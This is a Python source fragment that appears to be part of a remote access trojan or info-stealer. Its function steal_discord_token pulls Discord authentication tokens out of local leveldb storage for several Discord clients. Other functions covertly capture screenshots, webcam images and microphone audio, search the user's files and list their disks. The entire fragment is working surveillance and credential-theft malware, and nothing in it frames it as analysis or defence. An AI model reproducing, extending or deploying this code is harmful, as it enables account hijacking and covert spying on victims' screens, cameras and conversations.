def steal_discord_token():
    tokens = []
    bases = [
        os.path.expanduser(r"~\AppData\Roaming\discord\Local Storage\leveldb"),
        os.path.expanduser(r"~\AppData\Roaming\discordcanary\Local Storage\leveldb"),
        os.path.expanduser(r"~\AppData\Roaming\discordptb\Local Storage\leveldb"),
        os.path.expanduser(r"~\AppData\Roaming\Lightcord\Local Storage\leveldb"),
    ]
    for base in bases:
        if not os.path.isdir(base):
            continue
        for f in os.listdir(base):
            if not (f.endswith(".ldb") or f.endswith(".log")):
                continue
            try:
                data = open(os.path.join(base, f), "rb").read()
            except Exception:
                continue
            for m in re.findall(rb"[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38}", data):
                tokens.append(m.decode("utf-8", "ignore"))
            for m in re.findall(rb'"([\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110})"', data):
                tokens.append(m.decode("utf-8", "ignore"))
    seen = []
    for t in tokens:
        if t not in seen:
            seen.append(t)
    return seen


# ============================================================
#  SCREENSHOT (all monitors combined via mss virtual monitor)
# ============================================================
def screenshot_all():
    with mss.mss() as sct:
        shot = sct.grab(sct.monitors[0])   # 0 = full virtual desktop
        img = Image.frombytes("RGB", shot.size, shot.rgb)
        if img.width > 2400:
            img = img.resize((2400, int(img.height * 2400 / img.width)))
        buf = io.BytesIO()
        img.save(buf, format="PNG", optimize=True)
        buf.seek(0)
        return buf


# ============================================================
#  WEBCAM
# ============================================================
def webcam_capture():
    try:
        import cv2
        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cam.isOpened():
            cam.release()
            cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            return None
        ok = False
        for _ in range(3):
            ok, frame = cam.read()
            if ok: break
            time.sleep(0.2)
        cam.release()
        if not ok:
            return None
        ok, enc = cv2.imencode(".jpg", frame)
        if not ok: return None
        buf = io.BytesIO(enc.tobytes())
        buf.seek(0)
        return buf
    except Exception:
        return None


# ============================================================
#  MICROPHONE
# ============================================================
def record_mic(seconds=5):
    try:
        import sounddevice as sd
        import soundfile as sf
        import numpy as np
        fs  = 44100
        rec = sd.rec(int(seconds*fs), samplerate=fs, channels=1)
        sd.wait()
        buf = io.BytesIO()
        sf.write(buf, rec, fs, format="WAV")
        buf.seek(0)
        return buf
    except Exception as e:
        log(f"mic err: {e}")
        return None


# ============================================================
#  FIND / DISK
# ============================================================
def find_files(pattern, root=None, limit=200):
    if not root:
        root = os.path.expanduser("~")
    res = []
    pat = pattern.lower()
    for dirpath, dirs, files in os.walk(root):
        dirs[:] = [d for d in dirs if d not in ("node_modules", ".git", "__pycache__")][:20]
        for f in files:
            if pat in f.lower():
                res.append(os.path.join(dirpath, f))
                if len(res) >= limit:
                    return res
    return res

def disk_map_text():
    lines = []
    for part in psutil.disk_partitions(all=False):
        try:
            usage = psutil.disk_usage(part.mountpoint)
            total = usage.total / (1024**3)
            used  = usage.used  / (1024**3)
            pct   = usage.percent
            bar   = "█" * int(pct/5) + "░" * (20 - int(pct/5))
            lines.append(f"{part.device}  {bar}  {pct:.1f}%  ({used:.1f}/{total:.1f} GB)")
        except Exception:
            pass
    return "\n".join(lines) or "(no disks)"


